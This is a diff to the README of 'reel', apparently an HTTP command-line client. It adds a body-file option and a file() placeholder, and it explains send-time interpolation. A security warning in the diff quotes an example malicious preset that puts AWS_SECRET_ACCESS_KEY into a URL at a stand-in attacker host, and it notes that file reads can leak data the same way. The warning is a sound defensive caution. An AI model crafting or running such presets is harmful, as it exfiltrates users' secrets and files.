@@ -77,6 +77,7 @@ Commands can be combined freely in a single invocation.
 | `header-rm-all` | Remove all headers |
 | `body <BODY>` | Set request body |
 | `body @<PATH>` / `body -` | Set request body from a file / from stdin (`@@` escapes a body that starts with a literal `@`) |
+| `body-file <PATH>` | Set request body from a file, kept as a path and re-read on every send |
 | `body-rm` | Remove the request body |
 | `cookie-rm <NAME>` | Remove all session cookies with the given name |
 | `timeout <SECONDS>` | Set the request timeout (default: 30; `0` disables the timeout) |
@@ -86,12 +87,12 @@ Commands can be combined freely in a single invocation.
 | `get`/`post`/`put`/`patch`/`delete`/`head`/`options` `<URL>` | Shortcut: set method + URL and send |
 | `expect <CONDITION>` | Assert on the last response; abort with exit code 1 on failure |
 | `--dry-run` | Print the request that would be sent, without sending it (position-independent) |
-| `then <PATH>` | Load preset file, interpolate `${{ expr }}` from request/response history and environment, and send |
+| `then <PATH>` | Load a preset file and send it — `load <PATH> send` without clearing the history |
 | `show` | Print the current session state |
 | `curl` | Print the current request as an equivalent `curl` command |
 | `response [N\|all] [body\|headers]` | Show Nth response (default: last), or all; full JSON, body only, or headers only |
 | `reset` | Clear all session state |
-| `load <PATH>` | Load state from a JSON file |
+| `load <PATH>` | Load state from a JSON file (relative file paths inside it resolve against its directory) |
 | `save <PATH>` | Save current session state to a JSON file |
 | `fail` | Exit with code 1 if any `send` or `then` receives a 4xx/5xx response (position-independent) |
 | `--insecure` | Skip TLS certificate verification |
@@ -140,6 +141,17 @@ Like curl, `body` accepts `@path` to read the body from a file (verbatim, as wit
 reel method POST body @payload.json send
 jq '.data' export.json | reel body - send
 ```
+
+`body @path` reads the file **once**, when the command runs, and stores its contents in the session. `body-file <PATH>` stores the *path* instead and reads it on every send — so editing the payload and re-running `reel send` picks up the new contents, and a preset can ship next to its payload file rather than embedding a copy of it:
+
+```bash
+reel url https://api.example.com/users method POST body-file payload.json
+reel header Content-Type:application/json send   # reads payload.json
+$EDITOR payload.json
+reel send                                        # reads it again
+```
+
+The file contents are interpolated like any other body, so a payload file can itself carry `${{ }}` placeholders. A relative path given on the command line is resolved against the working directory; one that comes from a preset file is resolved against the preset's directory (falling back to the working directory when nothing is there), so a preset plus its payload can be moved or committed together.
 
 ### Reuse settings across calls
 
@@ -217,15 +229,22 @@ All state mutations still take effect and are saved; only the HTTP call is skipp
 
 ### Chaining requests with `then`
 
-`then` loads a preset file, fills in `${{ expr }}` placeholders using the full request/response history and environment variables, and sends the request immediately. This lets you chain dependent calls without scripting.
+`${{ expr }}` placeholders are resolved **when a request is sent**, against the full request/response history, the environment, and the session variables. They work wherever the request comes from — a preset loaded with `load`, or fields set directly with `url`, `header`, and `body`:
 
-The first request in a chain is loaded explicitly with `load` and sent with `send`. This is intentional — it lets you inspect or modify the session state before committing to the chain.
+```bash
+reel var id 42
+reel url 'https://api.example.com/users/${{ var.id }}' send
+```
+
+The session stores the placeholder, not the value it resolved to, so the next `send` resolves it afresh.
+
+`then <PATH>` is the chaining form: it is `load <PATH> send` without clearing the history, so each step can reference the ones before it. The first request in a chain is loaded explicitly with `load` and sent with `send` — that is intentional, it lets you inspect or modify the session state before committing to the chain.
 
 ```bash
 reel load login.json send then dashboard.json
 ```
 
-Supported expressions in preset files:
+Supported expressions:
 
 | Expression | Resolves to |
 |---|---|
@@ -247,11 +266,14 @@ Supported expressions in preset files:
 | `${{ uuid() }}` | A random v4 UUID (fresh per placeholder — handy for idempotency keys) |
 | `${{ now() }}` / `${{ now(+3600) }}` | Current Unix timestamp in seconds, optionally shifted |
 | `${{ base64('user:pass') }}` / `${{ base64(env.CREDS) }}` | Base64 of a quoted literal or of a nested expression (e.g. for Basic auth) |
+| `${{ file('fragment.json') }}` / `${{ file(var.path) }}` | Contents of a file, inserted verbatim (not interpolated again) |
 | `${{ env.API_HOST \| default: localhost:8080 }}` | Fallback value used when the expression cannot be resolved |
 
 The bare `body`/`status`/`headers.*` forms always refer to the **last** response, and bare `request.*` to the **last** request. Use `response[N].*` / `request[N].*` when you need to reach an earlier step in the chain — requests and responses share the same index, so `request[N]` is the request that produced `response[N]`.
 
 Request values are captured **after** interpolation, so `${{ request.* }}` reflects what was actually sent (useful for echoing back an id, correlation header, or URL you built in a previous step).
+
+To send a literal `${{ ... }}` — a CI workflow file, say, or a template the server itself renders — escape it by doubling the dollar sign: `$${{ ... }}` is sent as `${{ ... }}`.
 
 `${{ env.NAME }}` reads a variable from the process environment — handy for keeping secrets out of preset files (`"Authorization": "Bearer ${{ env.API_TOKEN }}"`). Because it does not depend on history, a preset that uses only `env.*` interpolates fine even as the first request in a chain. A referenced variable that is not set aborts the chain — unless the placeholder carries a `| default: <value>` fallback, which is used whenever the expression cannot be resolved:
 
@@ -259,7 +281,7 @@ Request values are captured **after** interpolation, so `${{ request.* }}` refle
 { "url": "https://${{ env.API_HOST | default: localhost:8080 }}/users" }
 ```
 
-> **Treat preset files like scripts.** A preset defines a request that `then` executes on your behalf — including `${{ env.* }}` and `${{ var.* }}` placeholders that can read any environment variable or session variable and embed it in the URL, headers, or body. A malicious preset such as `{"url": "https://evil.example/?t=${{ env.AWS_SECRET_ACCESS_KEY }}"}` would exfiltrate a secret to an attacker's server. Only run preset files you trust, and inspect unfamiliar ones first — `reel --dry-run then preset.json` shows exactly what would be sent, without sending it.
+> **Treat preset files like scripts.** A preset defines a request that `then` executes on your behalf — including `${{ env.* }}` and `${{ var.* }}` placeholders that can read any environment variable or session variable and embed it in the URL, headers, or body. A malicious preset such as `{"url": "https://evil.example/?t=${{ env.AWS_SECRET_ACCESS_KEY }}"}` would exfiltrate a secret to an attacker's server, and `body_file` or `${{ file('...') }}` can do the same with the contents of any file the preset names. Only run preset files you trust, and inspect unfamiliar ones first — `reel --dry-run then preset.json` shows exactly what would be sent, without sending it.
 
 #### Two-step example
 
@@ -474,7 +496,7 @@ Sessions are stored as plain JSON and can be edited or version-controlled:
 }
 ```
 
-The `responses` array is written automatically after each `send` (each record carries its `elapsed_ms` duration) and can be omitted when creating preset files — it will be populated on first use. The `cookies` array is the session's cookie jar, populated from `Set-Cookie` responses; it is never written to preset files. Session variables set with `reel var` appear as a `vars` object (`"vars": { "host": "api.example.com" }`) — also session-only, never written by `save`. PID-keyed session files also carry an `owner_start_time` field identifying the owning shell; it is ignored in preset files.
+A request may carry `"body_file": "payload.json"` instead of `body`: the path is read on every send, and a relative one in a preset file is resolved against that file's directory. The `responses` array is written automatically after each `send` (each record carries its `elapsed_ms` duration) and can be omitted when creating preset files — it will be populated on first use. The `cookies` array is the session's cookie jar, populated from `Set-Cookie` responses; it is never written to preset files. Session variables set with `reel var` appear as a `vars` object (`"vars": { "host": "api.example.com" }`) — also session-only, never written by `save`. PID-keyed session files also carry an `owner_start_time` field identifying the owning shell; it is ignored in preset files.
 
 > **Note:** Session files and preset files store credentials (e.g. `Authorization` headers) in plaintext (session files are created with `0600` permissions on Unix). Avoid committing preset files that contain real tokens to version control.
 
